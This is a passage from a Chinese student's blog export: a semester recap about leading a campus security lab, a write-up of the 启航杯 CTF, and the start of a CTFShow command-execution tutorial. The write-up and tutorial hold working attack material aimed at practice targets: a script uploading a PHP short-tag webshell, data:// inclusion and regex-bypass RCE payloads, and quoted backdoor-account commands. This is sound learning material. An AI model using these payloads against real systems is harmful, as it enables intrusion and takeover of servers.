十月\n\n假期没回家去青岛找xjh玩了一圈，然后就开始搞新生的事情，去招新的时候我真的焦虑死了，明明自己什么也不会但是还是要硬着头皮上，我不能让学弟学妹们像我大一一样艰苦，我想做一个好学长，像悲惨世界的冉阿让一样。然后院长还给我任务去把服务器搞下来利用上，感谢赵师傅一直在帮我捯饬。荣姐还任命我为网络安全社团的社长，同时也是我真正当上实验室负责人的时候。十月和十一月两个月，我每天忙的喘不过气，不敢睡懒觉，也不敢早睡每天都挤时间去忙，更别提学习了，去曲阜线下之后跟凯哥认识了，凯哥看我辛苦的折腾实验室给我说“行，青岛工学院隔了好几代人终于有个能撑起来的了”，然后每天我就给学弟学妹们答疑解惑，组织学习，给他们提供好的条件和学习路线。隔壁实验室的黄学长也逐渐熟络起来了，然后他告诉我iscc有个人工智能赛道，但是涉及到一些安全方向的内容，让我去帮忙一起做，我答应了还帮忙找了好几个人一起搞，然后认识了隔壁实验室比较优秀的同学们\n\n但是可惜的是山东省赛败兴而归。\n\n## 十一月\n\n十一月跟凯哥组队感谢凯哥带我拿下技能兴鲁的省三，我也拿了两个misc的二血，但是如果没有东道主给压力的话再加上工具齐全，我应该可以拿下两个一血和一个二血，akmisc。明年凯哥就离开学校了，需要我来顶上主力比赛了。凯哥也照顾了我很多很多，我对以后的规划也不再那么迷茫，凯哥是我认识的学长中最好的也是最牛的一个。\n\n然后我就去筹备校赛，服务器也收拾好了。\n\n## 十二月\n\n十二月一开始接到通知有个青岛市保密技术比赛，当时荣姐说看我太辛苦让我去带队，但是我知道自己实力不够，我带队不是最好的选择，于是我让赵师傅去了，明年我一定要去并且要拿下个人奖，还有济南的数据安全比赛因为和校赛冲突所以很遗憾没去成。\n\n这个月还能去厦门的因为iscc那边也打进线下了线下是厦门，是一个美好的人生经历，但是由于资金和时间问题和长城杯初赛冲突了我不能去不过队长也是很争气抱了一个国二回来。长城杯，我带二队，学长们去一队，好消息是我们都进线下了，赛制还不清楚但肯定会被打烂的。\n\n也是在这个月，学弟们开始展露锋芒了，[sun师傅](https://sun1028.top/)，扬秋师傅，咸鱼师傅，小黄鼠狼师傅Wea5e1还有年龄比我大的学弟涵哥，他们同样很优秀，剩下的学弟学妹们也是远超我大一的进度我感觉他们都很牛。\n\n## 一月\n\n一月五号的时候有个软件安全赛差点没报上，不过也是顺利进入南京线下，圆梦了，第一次自己带队去和学弟们打，第二天还要考两门期末，现在坐等线下拿奖嘻嘻\n\n我在家里疯狂压力学弟们，跟Demon也熟络起来组了很多比赛，还在尝试健身，接下来的一段时间我需要改变一下方向了，去试试src，比赛慢慢放给学弟们，打完25年山东省赛我就退役，必须拿下个人奖\n\n## 总结\n\n大二的这个学期真是充实到爆炸，几乎每天都在忙碌\n\n幸好有学长们的帮助，学弟们也很争气，我的付出都是值得的也希望学弟们能握住接力棒把实验室搞起来.\n","tags":["-随笔"]},{"title":"启航杯WP","url":"/2025/01/25/启航杯WP/","content":"\n这次启航杯跟Demon师傅组队，Demon师傅很牛做出两个misc但是web的发力期被我截断了不然肯定嘎嘎做，但是必须批评Demon找来的两个队友水的一逼而且态度真是无语，早早组好的局竟然有个人没报名，然后一整天都在当捧哏，一个ez的伪协议绕过就直接把他卡死一早上。下午我让他去写WP payload和思路都给了结果晚上了给我说：”写不出来~“另一个选手也是极品，报名了但是好像没参与，给一号选手用账号去了。最后定榜55名，我以为是没奖但是好像是前70给奖，但是无所谓了，题的质量很一般。可惜misc还是做少了经验太少不然感觉除了第二个osint以外其他的应该是能ak的，\n\n取证也是奇奇怪怪的FTK配了半天挂载到本地结果还是不好使一直权限不够权限不够的，不然感觉还能多做点取证题。\n\n幸亏有Demon师傅帮我分担写wp的重担，而且还给我投喂奶茶和点心真是破费了。\n\n## Crypto\n\n### Easy_RSA\n\n题目是开启容器给题，基本上就是动态flag\n\n![20250217132406168.png](D:/lwwblog/source/images/202502/20250217210017773-1739797529725-4.png)\n\n\n$$\nprivate_key = b'-----BEGIN RSA PRIVATE KEY-----\\nMIICWwIBAAKBgQDaRITFDVDfEl8XwGzeiYnK+ZL9tB16amRkn+1je4M7lONcmQEV\\nL673B9YpCZ1HVtD87G7xiHmc/wrgi8bzEVQ06YRLXThg6IoTbT6LUZPYZn8SevBN\\npc46oD8VPfMmplc0DXqg/HJaQYj4HhSTjontsO2ohGExUndlcpQrcDwQBQIDAQAB\\nAoGANF40LMMhICRcRGqatFnzgYuXxN8uI2zbYXktj6zWs7jpRBJBvD+QjxyGOZpg\\n7fjac5SWmcTQyOY4Sd+/gBosRYRA11O+ssWUvYva1pxAW36QYn6BApuuFOJV4iZN\\n7z5lyHdQU9AKW+qfCw5mYBqDu/gQ6aIKIqXcc4yzOuVWfZECQQDpO7X+cDDRUKMS\\nsrT5BUCgLKeZ+EvcItAMFDPctYWx3M4TWs7rx/4mKRLUb4M+kAeMjNRr/uHP1WbO\\nethUI/0HAkEA75LUucqfHxy70m6fM4TDbMd9+l/9rHur9LNOVATyOTtP8o6cEmNw\\n7jIm1+qCdY4UUV04E6JAJCdHfs2XvZPTkwJAARmD+SgkQshjjHIFQmtQ67BqNeKi\\n0O3lFzl9KRw9/iGxYwv5j8kInLty2EeSUdgyAOqlEcFI5Ub3Th/sJzFoPwJAWcBA\\nQXpPMnCpTKR0r/BE5jO2Vl4vwrZyLTIfXgqcVCSMRup2Pc1TOWlAdBM+3JtlsTWj\\nFHfsX573geGzvynqUQJAGVEl858Q0cjbagyTh5ByLxn+dR+Zsixjw7xBX1isJW2+\\n2iiEUVsixyYY3/Yk7/m+B/FF5iTV5G7pNK1oQ35fAA==\\n-----END RSA PRIVATE KEY-----'\npublic_key = b'-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDaRITFDVDfEl8XwGzeiYnK+ZL9\\ntB16amRkn+1je4M7lONcmQEVL673B9YpCZ1HVtD87G7xiHmc/wrgi8bzEVQ06YRL\\nXThg6IoTbT6LUZPYZn8SevBNpc46oD8VPfMmplc0DXqg/HJaQYj4HhSTjontsO2o\\nhGExUndlcpQrcDwQBQIDAQAB\\n-----END PUBLIC KEY-----'\nenmessage:WjCP8Htx9flF7S28xJz/eiwjOJr5QwJ9ZUTLL3PqujMsAWonjLeMLfcHprEY/lcyXOR3CShyE0HqQjEFnRrI0+cnwtFkY3OG341g6mEuwqG364vKmq95FPEi76y9ICdfuagTdAuzhzvISXkgATQ2V31nvgeln1+vuAq0hez9qEM=\nprivate_key = b'-----BEGIN RSA PRIVATE KEY-----\\nMIICXAIBAAKBgQDSkyfKFrEABN38FH5ZWwclPY+7z3I5qp8ckUcp0MDM9AEw9C4U\\n2TpQ6kX7o1DhxaX+lXZsvkY30VTjeFLagQLwyEvEaXkLrCkA6Vt+LRZrGh/eoji2\\nmwZgZQAP5mcNN+zd8UfJ477WiSnyFAhP9xo4Yk/ulBiiXbDzxJ6uENavhwIDAQAB\\nAoGAIlmyBHPrf3V2dtrVpPhF8/ZqaONAHsBtaz4XDe8JUdsTX1Z94UBxvxBbG9+6\\nNSebr/+BYt+D2d19NmGC9opUHaz0ngSTSAbLhJRKLfl/i2aI1I6A/Gj88zi8s6yF\\nsQr8jgLZMg1xYDtjXRRcMRB16fPXecikJBfUuhHocWEtyokCQQDY6o31ZF8mM2rl\\nz1QrOHs5oIAXGgWsrrPQS9dlFsp3b5xo4l7vwgZfl8bSCujfnM4v/KJfJt/TJu9E\\nWlTv8mupAkEA+IQZKsutRpb+zRKd+/jKZV3xXuo+eJGT8rydp5L1xy0Aen+qKZyd\\naTl2dUFUo04/bmxGKmsD/VPPjskpDOy/rwJBAI+7jGlIIwxLEdBJe3pQKMbcpUOp\\niI0ODjQ9rPJdEbfmivus1D+Gj3aUObhAZmKVosKFYoouVi2yJOVj/dgpCFECQF2o\\nkz+QsUYIRBEPciDzO3wGcqAd0dtoqgRyV0w/U4d0C1kfYgb6skxkzqMUMwy0wa0g\\n+zSjTkab3n5mi6UGWJsCQApqGz86U709A3G9gF34G75ePLQVwOI/9RjtzxuIY3Rn\\nBS5ACOsQb/kW1wal2MhCOdWKgDrl0KZpzg855Sh4Rd0=\\n-----END RSA PRIVATE KEY-----'\npublic_key = b'-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDSkyfKFrEABN38FH5ZWwclPY+7\\nz3I5qp8ckUcp0MDM9AEw9C4U2TpQ6kX7o1DhxaX+lXZsvkY30VTjeFLagQLwyEvE\\naXkLrCkA6Vt+LRZrGh/eoji2mwZgZQAP5mcNN+zd8UfJ477WiSnyFAhP9xo4Yk/u\\nlBiiXbDzxJ6uENavhwIDAQAB\\n-----END PUBLIC KEY-----'\nenmessage:OVafA/n9ovZx9rd+mM2lz41u4Ga1xaYJssXApL0hfKwBWTA/XAC+OX4hVk3UWPZbs/68oN/C5LmzwEfyBC0N10cOIuJq78eTvMLaj6tc72PPAbt+0YUBSbIMt6m7/kzty/l5nbZxVt4TCPyH8Zqr4NzriqQhNwjUhrhTGT7wJBs=\n$$\n其实我是不太会密码的然后附件给了一个py的模板\n\n```python\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import padding\nfrom cryptography.hazmat.primitives import hashes\nimport base64\n\n# 加载私钥\n\nprivate_key_pem = b\"\"\"\n-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQC8NruXkH2ORXb249GMv+8Y3tPd8nu5OOMPUV5L16KELi9AVxoY\nY1v7aEnMXNkUEQ1yeLjyxQrPV3QmQA9jaTLdLf/QgyxGPDlVjjb1g9uxxLr5N0a4\nSLZ9uaQ5EkswTFtvQyHzbC21eowxvVNapHMfEEp5YuThrgQynxuQCcHtswIDAQAB\nAoGAFUNKV8SV5/lBXSypSJvfBfHCgLFQuJZMfIyw46OQSMYzm11butlFaSEZLpJn\nXxolaUMUgy9Z2ckOUPXtZx8u2iv2t1UzJeh3cCbhGok4+Ja69JWoRQeslTk2W2Tx\nTYuUuspQYYrna+cUNsd4MRKMoa+bDosjRy3rqlnvPb5utC0CQQDSvDxlWjvI+pFf\n4fylByLBSlfDDDR80tXoMWj28t43JH+mviyl8rkX7zppH4BVe9IL+0nv+myWuJ8O\nIcQ4SZKHAkEA5KQZxRGMd1Ax1HhFqOPzqMFcszzzp2mpOEbZyhmrCRAa5MUmPIko\nrwYJvYwUWT7a3AZcl/Koi7bqhfFOo43adQJAS76k5rkcLA0EG7aanKaH83nJOa41\nX3hYsnCwDbMV9DQGPeS1H6Cyrsup7wcHlbI/uVbFKKCWT0ZkxSuV37VyGQJBANB2\nUkycgG60fopTEmg3VgwyKHv/gcPNEY2PA7lBh/DebzbQDdm50I8ruSvKES+BoHhl\nkHy1sTiZkOCIsANtLZUCQQCk1BgGGG+sKRHS2/xu3lT3C2Ihn1hrnNLMQ5QlC0JJ\n/FSHxvVpzB8o94PNq6X+KrK6p82WYfkLKl+A5YPhoh/Q\n-----END RSA PRIVATE KEY-----\n\"\"\"\n\n# 加载私钥\n\nprivate_key = serialization.load_pem_private_key(private_key_pem, password=None)\n\n# 加密的消息\n\nenmessage = b\"PfifIriIHAwst7UxsHPNj3CGwlnNWbB5iVVq9O6oEsinLxxJgHcTmBHFGxWA5FC87aHKARXCzwH+v4H1ES/lMSnkVuVfrQdReR62GYIWUYuB2Gb6LnEJ0n4x9sXBA5FrSH9wlu14WT4S+ko+90kCS2jgGC7R2vKRe2QfFFwZ1R8=\"\n\n# 解密消息\n\nencrypted_message = base64.b64decode(enmessage)\ntry:\n    decrypted_message = private_key.decrypt(\n        encrypted_message,\n        padding.PKCS1v15(),\n\n        # 使用适当的哈希算法\n\n​        algorithm=hashes.SHA256()\n​    )\n​    print(decrypted_message.decode())\nexcept Exception as e:\n​    print(f\"Decryption failed: {e}\")\n\n```\n\n然后去找ai，一开始是直接扔给他是不行的，但是多调教几次就好\n\npayload：\n\n```\n# -*- coding: utf-8 -*-\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nimport base64\n\n# 加载私钥\nprivate_key = b'''-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDEfgk6+MERVwmKx6b4w4HM+cKlP34Lz7qMICOnDK906zIQyA2a\n7YTba8vssM4jpf+RLda0ZtAWnLj+sVgsBQAaWQ8quUt2FJCFEglpCBbvvsdfBD/A\nWc6w58ekPUWvcMu+Q68EVUre1lSXl8Lt2U0ObB77l577nYAdr7rf7HJMlwIDAQAB\nAoGAAaKQLm7GIdV46DAOckt417J3AtZVv4C/AKN+fclb5xEonX3MqdldcvtL+xri\n3Du+tf/iUCX63UqjOhtSVytuJhuQ2QIUUrkNEPkNBye5aIPN6j4buZXHzyfyVxqy\n6zddT0HTGzIOEn9VIIHMydrrdvEYEd2ZrwlRQApTNAQztGECQQDOllqpJ/R/Kgb3\n8QuJvhN1jDco9DYb9c2+XZL3u5aFZpJ2C86gus2NrK8096V7LOt02Vc0n4gBuXYv\n9BMbo997AkEA832M97qZ+aVi0c0okDv0wORxtDDE/zoXOjzSMS+xMoC7i27Hn/Az\nDL6EHfYBxqj247Tq9QxMBMumclyL/+GOlQJALfwR2i1moxe7zVz+cH663iOD873I\nfZjNX1585GABNViLqXMfX2+1aZ/SsDufvjdVggEPBEuufpPF1w7BYhmsGQJABGJS\nU3OMqi4MJXLoNBCgS4jRc0kdgurs2COYNUKCkkI3Hj+UYJDWmngjsNZpGcaZC2iK\ngncCN2PjT1PTQXwyMQJBAJItDvEaRC8BzlC10h31KC6gmmwU8IsqBYe4B6+btvIT\nUXZ23kO/okQTy65x4MmP5g1XLJAj29jVeZAUW+/B2uo=\n-----END RSA PRIVATE KEY-----'''\n\n# 加密后的消息\nencrypted_message = b'''EfXlCYvGHy4Haw0cl9dW5ufxMoB9rgturZOVoKokBg/fHOPDpiYY+jeABxMKAgjr\nCbtync9Gx0l0dfYSs06KTKVfR5L4oZbwolWx19bCVWzlQ9f91x1Z8U/uE9fG0xna\n/wUTvrExm8QdKC1OxmSFvPNrffrkEDzEVWP3lTPZ3wQ='''\n\ndef decrypt_message(encrypted_message, private_key):\n    # 导入私钥\n    key = RSA.import_key(private_key)\n    # 使用PKCS1_OAEP解密\n    cipher = PKCS1_OAEP.new(key)\n    # 解码Base64格式的加密消息\n    decrypted_message = cipher.decrypt(base64.b64decode(encrypted_message))\n    return decrypted_message.decode()\n\n# 解密消息\ndecrypted_message = decrypt_message(encrypted_message, private_key)\n\n# 输出解密后的消息\nprint(\"解密后的消息:\")\nprint(decrypted_message)\n\n```\n\n![ezrsa2.png](https://Liang-WW.github.io/images/202501/启航杯/ezrsa2.png)\n\n`QHCTF{c0cd580e-2859-469c-b58e-cec1abe77e6d}`\n\n## MISC\n\n### 请找出拍摄地所在位置-OSINT\n\n这个题很恶心，我认为\n\n![请找出拍摄地所在位置.jpg](https://Liang-WW.github.io/images/202501/启航杯/请找出拍摄地所在位置.jpg)\n\n说一下我做这个题目的思路，首先就是对着图片本身去找一下主要就是看exif，但是一般这种网络迷踪肯定是不会给的，所以没有收获很正常，然后我就把目光放到那种精准定位的地方了，我想看左侧蓝色大巴后面小车棚的电话，直接去问问（哈哈真这么想的但是可惜很糊辨认不清楚）然后这些周围的商家店铺太杂乱了，地图上是很难找到的，但是我还是找了想碰碰运气。\n\n接下来的解题思路是锁定右上角的广告，柳城鸿鑫4s店，直接锁死柳州市，然后对着商家店铺输出，最后最容易找到的是绿源电动车上面的那个共享科技美学馆，直接就能锁定这个路口\n\n但是flag死活交不对，一开始我以为是我找错了\n\n*小明在接亲戚回家过年时随手拍了一张照片，之后他在网上发起了一个挑战：找到照片中的地点并排名前三的人，将获得额外奖励。现在，挑战就在你面前，你准备好接受了吗？*\n*提交方式：QHCTF{xx省/自治区xx市xx县/市/区xx路与xx路交叉口}*\n\n看到这个提交格式你不懵逼吗？\n\n最后过了一个多小时我实在做不出来的时候反应过来要不然试试没有/\n\n直接成功，真是无语以后建议给格式就标准一些，别老误导我们CTFer\n\n![osint1.png](https://Liang-WW.github.io/images/202501/启航杯/osint1.png)\n\n`QHCTF{广西壮族自治区柳州市柳城县六广路与榕泉路交叉口}`\n\n### OSINT-你猜猜这是哪？\n\n这道题当时没出，后来在群里问出题人解题思路，出题人说第一个osint是静心拍摄的，第二个osint纯纯随手拍\n\n但是我没想到这题最后20多解，估计是被py烂了，群里的大哥说去大众点评找酒店，不能找后面的银行，银行太多了，酒店反而好找\n\n我是没话说了，能找到感觉也是狗运，我是没狗运了\n\n![你猜猜这是哪？.jpg](http://Liang-WW.github.io/images/202501/启航杯/你猜猜这是哪？.jpg)\n\n### 你能看懂这串未知的文字吗\n\n这题当时也没出，很早就找到羊文了但是扔到随波逐流梭哈没有成功我就很懵逼\n\n![你能看懂这串未知的文字吗.png](https://Liang-WW.github.io/images/202501/启航杯/你能看懂这串未知的文字吗.png)\n\n在贴吧找到羊文对照表\n\n![羊文对照表.png](https://Liang-WW.github.io/images/202501/启航杯/羊文对照表.png)\n\n翻译之后是\n\n```\nszfpguw\nizgwesq\nzoaoerh\n```\n\n但是放到随波逐流里面梭哈没出来，赛后大师傅在群里说是维吉尼亚\n\nlsb隐写\n\nb1,rgb,lsb,xy .. text: \"qihangbeiiseasy\"\n\n然后在用随波逐流维吉尼亚解密就完美解出\n\n`cryptoveryeasybysheeb`\n\n包上{}和flag就行\n\n### PvzHE\n\n这个是植物大战僵尸的那个pvz是Demon做的，进去直接找到images\n\n有一个图片直接就是flag\n\n![ZombieNote1.png](https://Liang-WW.github.io/images/202501/启航杯/ZombieNote1.png)\n\n\n\n### 猿类的编程语言你了解吗\n\n![猿类的编程语言你了解吗.jpg](https:///Liang-WW.github.io/images/202501/启航杯/猿类的编程语言你了解吗.jpg)\n\n用jphs这个工具，但是以前没接触过图片还有这个方向的东西，后来在我的不知道哪个老学长祖传下来的工具包里面就搜到了\n\n但是要密码我不知道在哪，等着官方wp下来之后在看看吧，(根本没秘密我真服了，但是我鼠标点击就报错，回车就行了)导出这个hide之后是ook解密这题比较misc有点好玩\n\n```\nn```\n\nook解密[https://www.splitbrain.org/services/ook](https://www.splitbrain.org/services/ook)直接梭哈了\n\n\n\n### ______启动！\n\n这题是Demon解出的\n\n![启动1.png](https://Liang-WW.github.io/images/202501/启航杯/启动1.png)\n\n找到这个流量包，![启动2.png](https://Liang-WW.github.io/images/202501/启航杯/启动2.png)\n\ntcp追踪流\n\n但是Demon是找的ai直接就吐出来了具体解法没给出\n\n### QHCTF For Year 2025\n\n这个题也是Demon出的根据hint对着日历一个个画出来就能拼出来，不知道为什么这么简单的思路qit那边竟然没人做出来\n\n什么时候qit能来个大爹帮我分担一下压力啊\n\n```\nhint:\n080714212829302316092230-04111825121306132027-0605041118252627-08091009162330-0102031516170108152229-0108142229-0203041617180209162330-0108152229303124171003-231609021725181104-01020917233029\n```\n\n![日历.png](https://Liang-WW.github.io/images/202501/启航杯/日历.png)\n\n最后拼出来是QHCTF{FUN}这个题没啥意思\n\n\n\n## WEB\n\n### PCREMagic\n\n学弟做出来之后给我说是php短标签绕过，然后他写了脚本给我\n\n源码：\n\n```php\n <?php\nfunction is_php($data){\n     return preg_match('/<\\?php.*?eval.*?\\(.*?\\).*?\\?>/is', $data);\n}\n\nif(empty($_FILES)) {\n    die(show_source(__FILE__));\n}\n\n$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);\n$data = file_get_contents($_FILES['file']['tmp_name']);\nif (is_php($data)) {\n    echo \"bad request\";\n} else {\n    if (!is_dir($user_dir)) {\n        mkdir($user_dir, 0755, true);\n    }\n    $path = $user_dir . '/' . random_int(0, 10) . '.php';\n    move_uploaded_file($_FILES['file']['tmp_name'], $path);\n\n    header(\"Location: $path\", true, 303);\n    exit;\n}\n?> 1\n```\n\n学弟做出来之后给我说是php短标签绕过，然后他写了脚本给我\n\n```python\nimport requests\nurl = 'http://challenge.qihangcup.cn:33842/'\nfile = {'file': ('1.php', '<?=eval($_POST[1]);?>', 'images/png')}\nres = requests.post(url, files=file, allow_redirects=False)\nprint(f\"路径: {url}{res.headers['Location']} ,木马为：1\")\n```\n\n![PCREMagic-PY.png](http://Liang-WW.github.io/images/202501/启航杯/PCREMagic-PY.png)\n\n用蚁剑连接,在根目录下找到flag\n\n![蚁剑.png](https://Liang-WW.github.io/images/202501/启航杯/蚁剑.png)\n\n那么这道题对我来说肯定不是这样就得过且过了\n\n开始复盘：\n\n```php\n <?php\nfunction is_php($data){\n     return preg_match('/<\\?php.*?eval.*?\\(.*?\\).*?\\?>/is', $data);\n}\n//这里是一个函数，data传参里面不允许有“/<\\?php.*?eval.*?\\(.*?\\).*?\\?>//”is这些东西，把<?php ?>标签ban了\n\nif(empty($_FILES)) {\n    die(show_source(__FILE__));\n}\n\n//这段代码的意思是如果$_FILES为空（即没有上传的文件），则执行die(show_source(__FILE__))，这会终止程序执行并输出当前文件的源代码。就是说让你传文件呢！\n\n\n$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);\n$data = file_get_contents($_FILES['file']['tmp_name']);\nif (is_php($data)) {\n    echo \"bad request\";\n} else {\n    if (!is_dir($user_dir)) {\n        mkdir($user_dir, 0755, true);\n    }\n    $path = $user_dir . '/' . random_int(0, 10) . '.php';\n    move_uploaded_file($_FILES['file']['tmp_name'], $path);\n\n    header(\"Location: $path\", true, 303);\n    exit;\n}\n?> \n```\n\n因为把很多东西都ban了 让传文件<?php ?>又不能用，那就用php短标签去写一个小马\n\n#### php短标签\n\n```\n<?php ?>是正和常情况下的标签，用于识别这是个php文件，但php也允许使用短标签<? ?>和<?=  >，可以用于php被过滤的情况下。 <? ?>等价于<?php ?> <?= >等价于<?php echo ?>\n举个例子：\n<?='Hello World'?>    // 输出 \"Hello World\"\n```\n\n细细品味一下学弟的payload\n\n```python\nimport requests\nurl = 'http://challenge.qihangcup.cn:33842/'\nfile = {'file': ('1.php', '<?=eval($_POST[1]);?>', 'images/png')}/*建了一个字典，键为 “file”，值是一个元组。元组中第一个元素是字符串 '1.php'，代表一个文件名；第二个元素是字符串也就是文件内容，images/png应该是定义成png格式方便绕过吧'*/\nres = requests.post(url, files=file, allow_redirects=False)//剩下的就是post传参了\nprint(f\"路径: {url}{res.headers['Location']} ,木马为：1\")//回显蚁剑的连接路径\n```\n\n\n\n### Easy_include\n\n源码：\n\n```php\n<?php \nerror_reporting(0); \n//flag in flag.php \n$file=$_GET['file']; \nif(isset($file)) \n{ \n    if(!preg_match(\"/flag/i\",$file)) \n    { \n        include($file); \n    } \n    else \n    { \n        echo(\"no no no ~ \"); \n    } \n} \nelse \n{ \n    highlight_file(__FILE__); \n} \n\n?> \n```\n\n一个简单的文件包含，用data伪协议读取\n\n?file=data://text/plain,<?=system('tac fl*');?>\n\n### Web_IP\n\n\n\n## Forensic\n\n早上起来启航杯平台关了，等着后续平台重启我再去补上Forensic的复现\n\n中午就开放了服了，本来还想歇会，但是我还是拖了两天哈哈根本不想学习。\n\n给出附件（10G）通过网盘分享的文件：启航杯取证.7z\n链接: https://pan.baidu.com/s/1xZ3bY58Td-OQ6CqyrVpNAw?pwd=23ch 提取码: 23ch\n\n解压密码是90382728-ca22-48e7-8413-61f6438f1b90\n\n关于取证这个题给的是e01文件我只会用ftk进行挂载肯定还有别的方式但是好像要收费\n\n然后由于我把这些乱七八糟的东西基本上都放到D盘里面然后D盘权限只给了可读和可写没有给完全控制导致我一直挂载好也进去不\n\n今天捣鼓的时候突然想着看一眼D盘权限果然解决那就继续看看取证\n\n首先就是[**FTK挂载**](https://blog.csdn.net/qq_32393893/article/details/142825936?fromshare=blogdetail&sharetype=blogdetail&sharerId=142825936&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)，FTK其实就是镜像虚拟仿真用的，FTK挂载到本地你本地就会出现挂载起来的磁盘，在此电脑中就能直接看到然后其实就能够正常访问了应该是这样\n\n![FTK本地挂载.png](http://Liang-WW.github.io/images/202501/启航杯/FTK本地挂载.png)\n\n这个时候可以去虚拟机里面搞去仿真，也可以直接本地做题，在这次取证好像win6很难出解，出题人说是因为win6会被杀毒软件杀掉\n\n#### Win_01\n\n某天，小明正在某网站进行学习。突然，一位蛤客盯上了他，并向他发送了一封钓鱼邮件。由于小明刚接触网络安全，对钓鱼邮件并不熟悉，他不小心下载并点击了邮件中的附件。当他后来学习到钓鱼邮件的相关知识时，已经为时晚矣。于是，他请求你帮助找出蛤客的痕迹。请你针对附件镜像进行一次应急响应，查找以下flag值。压缩包附件的解压密码为：90382728-ca22-48e7-8413-61f6438f1b90。请以QHCTF{xxxxxxxx}的格式提交结果。\n\n1.找出系统中蛤客的ip地址及端口，提交方式请以QHCTF{md5(127.0.0.1:80)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}\n\n\n\n#### Win_02\n\n蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码，提交方式请以QHCTF{md5(user_password)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}\n\n\n\n这个控制系统后的操作看C3师傅的笔记能知道一般都是在powershell的记录里面G:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\n\n也就是这个路径下有一个文件\n\nnet user HackY$ 123456 /add\nnet user HackY$ /de;\nnet user HackY$ /del\nnet user HackY$ 123456 /add\nnet user HackY$ /del\n\n#### Win_04\n\n4.蛤客在系统数据库中藏了一些东西，请你找出其中的flag值\n提交方式：QHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n\n\n\n这个题是在注册表里面找到的flag\n\n#### Win_05\n\n5.小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么，提交方式请以QHCTF{md5(xxxx_10_127.0.0.1)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}\n\n\n\n\n\n#### Win_06\n\n6.请你找出蛤客在启动项中藏的flag\n 提交方式：QHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n\n#### Win_07\n\n蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值\n提交方式：QHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n","tags":["-WP -CTF"]},{"title":"命令执行RCE（CTFSHOW）","url":"/2025/01/23/命令执行RCE（CTFSHOW）/","content":"\n# RCE        \n\n RCE（remote code execute）：远程命令执行或者代码执行，我们平时说的rce，比如thinkPHP的rce漏洞，即算代码注入漏洞，也算rce漏洞，因为渗透的最终情况可以实现执行命令或者是代码都属于RCE，例如代码执行、文件包含、反序列化、命令执行，甚至是写文件Getshell都可以属于RCE\n\n关于命令执行，我的认知是web的基础功底，很多别的种类的题目例如ssti这种类型的找到flag时用到的姿势和命令执行很相像思路也是比较接近，所以我们一定由浅入深的把基础的命令执行payload理解透彻\n\n首先就是cat flag（别给我说这个你不会，不会自己查去其实就是个打开的命令，但是在我刚开始进行练习的时候面对的是个tac，一开始我以为是后端写的东西，必须倒叙才行，但是越感觉越不对劲，于是我就去问后来得到个差不多的理解\n\ntac 我的理解是从cat的文件里面倒序出每一行其实就是一种简便的命令\n\nisset() 函数用于检测变量是否已设置并且非 NULL//其实就是保证你正常传参的\n\n本篇文章主要参考落寞的魚师傅的[web命令执行入门](https://blog.csdn.net/Aluxian_/article/details/131024590?fromshare=blogdetail&sharetype=blogdetail&sharerId=131024590&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)\t星|焰师傅的[命令执行详解](https://blog.csdn.net/m0_65409532/article/details/141852711?fromshare=blogdetail&sharetype=blogdetail&sharerId=141852711&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)(但是理论偏多)说多无益多看看题试着做几道就会很舒服了\n\n\n\n\n\n#### web29\n\n```php\n<?php\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); \n}\n```\n\n传参禁止flag字段思路:用通配符*补充好flag.php,然后想办法搞到\n\n`?c=system(\"cp fla* example.txt\");`\n\n积累姿势,这种情况是指的用复制命令把fla*-- *号自动补充后面的内容其实就是指的flag.php\n\n复制了一份新的并命名为example.txt再访问即可\n\n#### web30\n\n```php\n<?php\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag|system|php/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); \n}\n\npayload:?c=echo exec('nl fla?????');//nl是一个文本处理命令，主要用于为文件中的行添加行号\n//payload的意思我是这样翻译的:获取最后一行输出,然后这个命令是nl fla???,就是说fla??的那一行要显示行号然后显示出来内容\nsystem()\npassthru()//也是用于执行外部命令 passthru()函数主要用于执行一些会产生二进制输出的命令\nexec()//它主要是获取命令执行后的最后一行输出。它会将命令的输出放入一个数组（如果提供了第二个参数），并且返回命令的最后一行输出内容。\nshell_exec()//shell_exec()函数执行命令并返回命令的输出结果（作为一个字符串）。它类似于exec()函数，但返回的是完整的输出，而不是最后一行。\npopen()\nproc_open()\npcntl_exec()\n反引号 同shell_exec() \n\n```\n\n\n\n**反引号在php中类似于system函数 可以执行shell命令**\n\n#### web32\n\n```php\n<?php\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); \n}\n\npayload:php://filter/read=convert.base64-encode/resource=flag.php 